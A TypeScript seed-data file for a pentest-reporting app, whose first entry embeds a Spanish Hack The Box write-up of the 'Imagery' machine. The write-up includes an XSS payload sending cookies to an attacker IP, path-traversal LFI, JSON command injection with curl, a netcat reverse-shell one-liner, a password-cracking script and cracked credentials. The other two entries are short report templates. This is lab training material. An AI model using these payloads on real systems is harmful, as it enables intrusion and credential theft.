import type { Project } from './types';
import { sub, formatISO } from 'date-fns';

const now = new Date();

export const initialProjects: Project[] = [
  {
    id: 'proj-htb-imagery',
    clientId: 'cli-h4ck',
    name: 'Imagery HTB Writeup',
    icon: 'FileText',
    status: 'Completed',
    language: 'es',
    startDate: '2025-10-14',
    endDate: '2025-10-14',
    createdAt: formatISO(sub(now, { weeks: 1 })),
    updatedAt: formatISO(sub(now, { weeks: 1 })),
    reportBody: `## Información General
- **Nombre de la máquina:** Imagery
- **IP:** 10.10.11.88
- **Sistema Operativo:** Linux
- **Dificultad:** 🟡 Media
- **Fecha:** 14-10-2025

---
## Reconocimiento Inicial

### Añadir IP a /etc/hosts
\`\`\`bash
echo "10.10.11.88 imagery.htb" | sudo tee -a /etc/hosts
\`\`\`

### Escaneo de Puertos (Nmap)

#### Simple Scan
\`\`\`bash
sudo nmap -v -sV -T5 10.10.11.88
\`\`\`
\`\`\`
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\`\`\`
*Encontramos 2 puertos abiertos, destacando el puerto 8000 que corre un servidor Werkzeug.*

#### Escaneo Avanzado
Podemos usar Visual Map con un escaneo en XML para detectar posibles vulnerabilidades o vectores de entrada:
\`\`\`bash
sudo nmap -v -A 10.10.11.88 -oX scan.xml
\`\`\`
\`\`\`
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.7p1 Ubuntu 7ubuntu4.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:94:fb:70:36:1a:26:3c:a8:3c:5a:5a:e4:fb:8c:18 (ECDSA)
|_  256 c2:52:7c:42:61:ce:97:9d:12:d5:01:1c:ba:68:0f:fa (ED25519)
8000/tcp open  http    Werkzeug httpd 3.1.3 (Python 3.12.7)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-title: Image Gallery
|_http-server-header: Werkzeug/3.1.3 Python/3.12.7
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
\`\`\`

---
## Análisis con Visual Map

[Visual-Map](https://github.com/afsh4ck/Visual-Map)
### Resumen de Scripts NSE
Este análisis de scripts NSE revela la presencia de dos servicios clave:
- **Servicio SSH:** Se identificaron claves de host ECDSA y ED25519, lo que confirma la ejecución de un servidor SSH.
- **Servicio Web (HTTP):**
  - El servidor web soporta los métodos HTTP OPTIONS, HEAD y GET.
  - El título de la página web es "Image Gallery".
  - La tecnología subyacente del servidor es Werkzeug/3.1.3 sobre Python/3.12.7.

---
## Acceso Web
Accedemos a 
http://10.10.11.88:8000/
 y observamos que parece ser una galería de fotos online. Nos registraremos para ver la aplicación web por dentro.
Una vez dentro vemos que podemos subir una imagen, por lo que puede ser el vector de entrada principal.

### Prueba de subida de archivos
Después de probar multitud de técnicas de subidas de archivos, doble extensión de archivos, MIME Types, bypass de blacklists, etc... parece que no podemos ejecutar PHP de ninguna manera, por lo que este vector de entrada queda descartado en principio.

---
## XSS
Encontramos en el footer un apartado de la web que no habíamos visto antes, un apartado para reportar un bug.
Curiosamente este apartado es vulnerable a XSS y conseguimos la cookie del administrador con el siguiente script:
\`\`\`html
<img src=1 onerror="document.location='http://10.10.14.100:80/?c='+document.cookie">
\`\`\`
Abrimos un servidor PHP por el puerto 80 y recibimos la cookie casi al instante. Tenemos que tener en cuenta que esta cookie es rotatoria y va cambiando cada cierto tiempo.
\`\`\`bash
afsh4ck@kali$ sudo php -S 0.0.0.0:80
[Tue Oct 14 05:18:22 2025] PHP 8.4.6 Development Server (http://0.0.0.0:80) started
\`\`\`
Tenemos la cookie:
\`c=session=.eJw9jbEOgzAMRP_Fc4UEZcpER74iMolLLSUGxc6AEP-Ooqod793T3QmRdU94zBEcYL8M4RlHeADrK2YWcFYqteg571R0EzSW1RupVaUC7o1Jv8aPeQxhq2L_rkHBTO2irU6ccaVydB9b4LoBKrMv2w.aOzo2A.7XVtQ7-bk28X8Mo8ymB4xYZ8Rh4\`

---
## Admin panel
Al editar la cookie y recargar la página vemos un panel de administración donde podemos descargarnos un log del usuario y el administrador de la web.
El log no contiene nada interesante:
\`\`\`bash
cat admin@imagery.htb.log 
[2025-10-13T12:00:09.151016] Logged in successfully.
[2025-10-13T12:00:09.164590] Logged in successfully.
[2025-10-13T12:01:09.098800] Logged in successfully.
[2025-10-13T12:02:08.818371] Logged in successfully.
[2025-10-13T12:02:08.841170] Logged in successfully.
\`\`\`

---
## Local File Inclusion (LFI)
Al capturar el request de descarga de log, encontramos un parámetro \`log_identifier\` que es vulnerable a LFI, permitiéndonos ver el contenido de archivos cómo el etc/passwd:
\`GET /admin/get_system_log?log_identifier=../../../../../etc/passwd\`
Encontramos un usuario \`mark\` con shell y que nos llama la atención.

---
## Dumpeo de variables de entorno y usuario actual
### Credenciales de admin
Las credenciales del administrador y el usuario de prueba las encontramos en \`db.json\` en \`config.py\`, que es el archivo de configuración común junto con \`app.py\` en los servidores Python.
\`\`\`json
"users": [
        {
            "username": "admin@imagery.htb",
            "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
            "isAdmin": true,
            "displayId": "a1b2c3d4",
            "login_attempts": 0,
            "isTestuser": false,
            "failed_login_attempts": 0,
            "locked_until": null
        },
        {
            "username": "testuser@imagery.htb",
            "password": "2c65c8d7bfbca32a3ed42596192384f6",
            "isAdmin": false,
            "displayId": "e5f6g7h8",
            "login_attempts": 0,
            "isTestuser": true,
            "failed_login_attempts": 0,
            "locked_until": null
        },
]
\`\`\`
Las contraseñas tienen un formato de hash, por lo que vamos a crackearlas.

### Cracking de hashes
Solamente conseguimos crackear la contraseña del usuario de prueba: \`iambatman\`
No podemos conectarnos directamente por SSH:
\`\`\`bash
ssh testuser@imagery.htb
# Permission denied (publickey).
\`\`\`
Así que nos loguearemos directamente con su usuario en la web. Observamos que este usuario tiene desbloqueadas algunas funcionalidades que un usuario normal no tiene. Por ejemplo al subir una imagen legítima y hacer click en las opciones de la imagen, vemos que ahora tenemos todas desbloqueadas, cuando antes solamente teníamos Download y Delete.
Hay una funcionalidad interesante de \`visual image transformation\`, con la que podemos transformar una imagen y pasa varios parámetros en un JSON:
\`\`\`json
"params":{
    "x":0,
    "y":0,
    "width":900,
    "height":515
}
\`\`\`

---
## RCE a través de JSON
Le inyectaremos un comando en el primer valor para hacer la comprobación. Haremos un curl y intentaremos inyectar un comando de S.O. como \`whoami\`:
\`\`\`json
"params":{
    "x":";curl http://10.10.14.100?output='whoami';",
    "y":0,
    "width":900,
    "height":515
}
\`\`\`
Recibimos el test en nuestra terminal, lo que significa que el input es vulnerable y podemos ganar una shell.

### Ganando la shell
Abrimos un listener de netcat en nuestro equipo atacante:
\`nc -nlvp 8888\`
Y usaremos el siguiente payload para devolvernos una conexión de netcat y ganar la shell:
\`;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.100 8888 >/tmp/f;\`
Estamos dentro!
\`\`\`bash
$ whoami
web
\`\`\`

### Tratamiento de la TTY
Tenemos una shell limitada, por lo que haremos el tratamiento de la TTY para movernos mejor:
\`\`\`bash
$ python -c 'import pty; pty.spawn("/bin/bash")'
web@Imagery:~/web$
\`\`\`

---
## Credential hunting
Buscaremos credenciales para seguir moviéndonos por el sistema. Encontramos un archivo de backup pero está cifrado:
\`\`\`bash
cd var/backup
ls
# web_20250806_120723.zip.aes
\`\`\`

### Cracking de ZIP con cifrado AES
No podemos extraerlo directamente. Nos enviamos el archivo backup a nuestra máquina de atacante para trabajar mejor y lo crackeamos con el siguiente script de python:
\`\`\`python
#!/usr/bin/env python3
import pyAesCrypt
import sys
import os
if len(sys.argv) < 3:
    print("Usage: python crack.py file.zip.aes wordlist.txt [outdir]")
    sys.exit(1)
encfile = sys.argv[1]
wordlist = sys.argv[2]
outdir = sys.argv[3] if len(sys.argv) > 3 else "attempt_out"
os.makedirs(outdir, exist_ok=True)
# chunk size used by pyAesCrypt (default value).
bufferSize = 64 * 1024
total = 0
with open(wordlist, "r", errors="ignore") as f:
    for line in f:
        pwd = line.rstrip("\\n\\r")
        if not pwd:
            continue
        total += 1
        if total % 1000 == 0:
            print(f"Attempt #{total}: '{pwd[:30]}'")
        outpath = os.path.join(outdir, "temp_decrypted_output")
        try:
            # pyAesCrypt.decryptFile throws ValueError on wrong password (or IntegrityError)
            pyAesCrypt.decryptFile(encfile, outpath, pwd, bufferSize)
            print()
            print("Password Cracked")
            print(pwd)
            print("Decrypted output saved to:", outpath)
            sys.exit(0)
        except (ValueError, Exception) as e:
            # Wrong password will generally raise ValueError / IntegrityError
            # Remove any incomplete file
            if os.path.exists(outpath):
                try:
                    os.remove(outpath)
                except:
                    pass
            # continue trying
            continue
print("Password NOT found in the provided wordlist.")
sys.exit(2)
\`\`\`
Al ejecutarlo obtenemos una contraseña en plano: \`bestfriends\`. Al leer el archivo \`db.json\` del backup, esta vez si conseguimos el hash del usuario \`mark\` y con crackstation lo crackeamos al instante: \`supersmash\`

---
## User Flag
No podemos acceder por SSH, por lo que cambiaremos al usuario mark desde la propia shell que ya tenemos:
\`\`\`bash
su mark
# Password: supersmash
whoami
# mark
cat /home/mark/user.txt
# 45e334738070b9da3439a17e********
\`\`\`

---
## Escalada de Privilegios
### Enumeración de Privilegios
Tenemos permisos de ejecución como root en el ejecutable \`charcol\`:
\`sudo -l\`
Al ejecutarlo con \`sudo charcol shell\` nos pide una contraseña, pero podemos resetearlo con la flag \`-R\`:
\`\`\`bash
sudo charcol -R
# Enter system password for user 'mark' to confirm: supersmash
# Charcol application password has been reset to default (no password mode).
\`\`\`
Ahora ya no pedirá contraseña al ejecutarlo.
### Obtener la Root Flag con Charcol
Usaremos el siguiente comando de charcol para copiar la root flag a nuestro directorio principal de mark:
\`charcol> auto add --schedule "* * * * *" --command "cat /root/root.txt > /home/.flag" --name "root_flag" --log-output /home/.flag\`

---
## 👑 Root Flag
En el directorio \`/home\` nos encontramos la flag de root:
\`\`\`bash
cat /home/.flag
# 8277d5fb5ed2084c53cd563a********
\`\`\`
Podríamos hacer lo mismo para conseguir el \`id_rsa\` de root (si lo tiene) y acceder por SSH para un control total del sistema.
`,
  },
  {
    id: 'proj-1',
    clientId: 'cli-htb',
    name: 'Q3 Web App Pentest',
    reportBody: `## Executive Summary
This report details the findings of the penetration test conducted on **Q3 Web App Pentest** for **Hack The Box** between 2023-07-01 and 2023-07-15. The assessment identified **2** total vulnerabilities, including **1** critical and **1** high-risk findings. Urgent remediation is recommended for critical vulnerabilities to mitigate potential impact.

---
## Scope & Methodology
The assessment was conducted from the perspective of an external, unauthenticated attacker (black-box).

### Scope
- **Web Applications:** *.hackthebox.eu, api.hackthebox.eu
- **External Network:** 138.68.128.0/24

### Methodology
1. **Reconnaissance:** Discovering subdomains, open ports, and services.
2. **Vulnerability Scanning:** Using automated tools to identify common vulnerabilities.
3. **Manual Verification & Exploitation:** Manually validating findings and attempting to exploit identified weaknesses.
4. **Reporting:** Documenting vulnerabilities and providing remediation guidance.

---
## Attack Narrative
The engagement began with reconnaissance against the *.hackthebox.eu domain, which revealed the existence of an outdated blog and a development server with directory listing enabled. An SQL Injection vulnerability was discovered and exploited on the main web application's login form, allowing for authentication bypass. This access was leveraged to uncover a Stored XSS vulnerability in the user profile section, which could be used to target other users, including administrators.

---
## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|:---|---|:---|
| <span style="color:red">Critical</span> | 9.0 - 10.0 | Vulnerabilities that could lead to immediate system compromise. |
| <span style="color:orange">High</span> | 7.0 - 8.9 | Vulnerabilities that could allow an attacker to gain unauthorized access. |
| <span style="color:yellow">Medium</span> | 4.0 - 6.9 | Weaknesses that could reveal sensitive information. |
| <span style="color:blue">Low</span> | 0.1 - 3.9 | Minor issues that reduce the overall security posture. |
| <span style="color:gray">Informational</span> | 0.0 | Observations about the external footprint. |
`,
    startDate: '2023-07-01',
    endDate: '2023-07-15',
    status: 'Completed',
    language: 'en',
    createdAt: formatISO(sub(now, { months: 2 })),
    updatedAt: formatISO(sub(now, { months: 1 })),
    icon: 'Scan'
  },
  {
    id: 'proj-2',
    clientId: 'cli-ine',
    name: 'Análisis de Red Interna',
    reportBody: `## Resumen Ejecutivo
Este informe detalla los hallazgos de la evaluación de seguridad de la red interna para **INE Security**, realizada entre el 10-08-2023 y el 20-08-2023. El objetivo era identificar vulnerabilidades explotables desde la perspectiva de un actor malicioso con acceso a la red corporativa. Se descubrieron múltiples debilidades, incluyendo el uso de credenciales por defecto en servicios críticos y software sin parches que permitieron la escalada de privilegios hasta el nivel de Administrador de Dominio. Se recomienda la remediación inmediata de los hallazgos críticos.

---
## Alcance y Metodología

### Alcance
- **Rangos IP:** 10.10.0.0/16
- **Supuestos:** La evaluación se realiza desde la perspectiva de un atacante que ha obtenido un punto de apoyo en la red interna (p.ej., una estación de trabajo comprometida).
- **Exclusiones:** No se realizaron pruebas que pudieran causar una denegación de servicio en sistemas de producción críticos.

### Metodología
1. **Descubrimiento de Activos:** Identificación de hosts activos, puertos y servicios en la red.
2. **Enumeración de Servicios:** Análisis de servicios para identificar versiones, configuraciones y posibles vulnerabilidades.
3. **Explotación y Movimiento Lateral:** Intento de explotar vulnerabilidades para ganar acceso y moverse a través de la red.
4. **Escalada de Privilegios:** Búsqueda de vías para elevar los privilegios en los sistemas comprometidos y en el dominio de Active Directory.
`,
    startDate: '2023-08-10',
    endDate: '2023-08-20',
    status: 'In Progress',
    language: 'es',
    createdAt: '2023-08-10T09:00:00Z',
    updatedAt: formatISO(sub(now, { days: 3 })),
    icon: 'Network'
  },
];
